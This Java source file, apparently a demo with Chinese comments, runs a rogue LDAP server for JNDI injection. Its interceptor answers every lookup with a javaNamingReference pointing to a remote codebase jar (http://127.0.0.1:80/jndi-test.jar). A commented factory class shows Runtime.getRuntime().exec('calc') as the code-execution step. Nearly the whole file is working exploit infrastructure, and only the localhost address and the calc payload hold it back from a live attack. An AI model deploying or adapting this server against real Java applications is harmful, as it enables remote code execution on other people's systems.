package com.dem0.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;


/**
 *
 * public class ReferenceObjectFactory implements ObjectFactory {
 *
 *     
 *      * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。
 *      * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。
 *      * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。
 *      * @param env  创建对象时使用的环境（可能为 null）。
 *      * @return 对象工厂创建出的对象
 *      * @throws Exception 对象创建异常
 *
// *public Object getObjectInstance(Object obj,Name name,Context ctx,Hashtable<?, ?> env)throws Exception{
//        *         // 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE
//        *return Runtime.getRuntime().exec("calc");
//        *}
//        *
//        *}
 */
public class Server {
    //设置LDAP的端口
    public static  final int SERVER_PORT =3890;
    //绑定地址
    public static final String BIND_HOST="127.0.0.1";
    //设置实体名字
    public static final String LDAP_ENTRY_NAME="test";
    //或者服务地址
    public static String LDAP_URL="ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;
    //CODE远程
    public static final  String REMOTE_URL = "http://127.0.0.1:80/jndi-test.jar";
    //设置dn
    public  static  final String LDAP_BASE="DC=java,DC=org";

    public static void main(String[] args) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            //设置监听信息
            //public InMemoryListenerConfig(String listenerName, InetAddress listenAddress,
            // int listenPort, ServerSocketFactory serverSocketFactory, SocketFactory clientSocketFactory,
            // SSLSocketFactory startTLSSocketFactory)
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", InetAddress.getByName(BIND_HOST),SERVER_PORT,
                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()

            ));
            //添加自定义的拦截器 比较难的设置方式
            config.addInMemoryOperationInterceptor(new OperationInterceptor());

            //创建LDAP服务对象
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();

            System.out.println("LDAP在" +  LDAP_URL);
        } catch (LDAPException e) {
            e.printStackTrace();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor{
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result){
            String base = result.getRequest().getBaseDN();//获取请求的那个base
            Entry entry = new Entry(base);
            try{
                //设置对象的工厂类名
//                String className = "com.dem0.ldap.ReferenceObjectFactory";
                String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
                entry.addAttribute("javaClassName",className);
                entry.addAttribute("javaFactory",className);
                //设置远程的恶意引用对象的jar地址
                entry.addAttribute("javaCodeBase",REMOTE_URL);

                //设置LDAP objectClass
                entry.addAttribute("objectClass","javaNamingReference");
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (LDAPException e) {
                e.printStackTrace();
            }
        }
    }
}
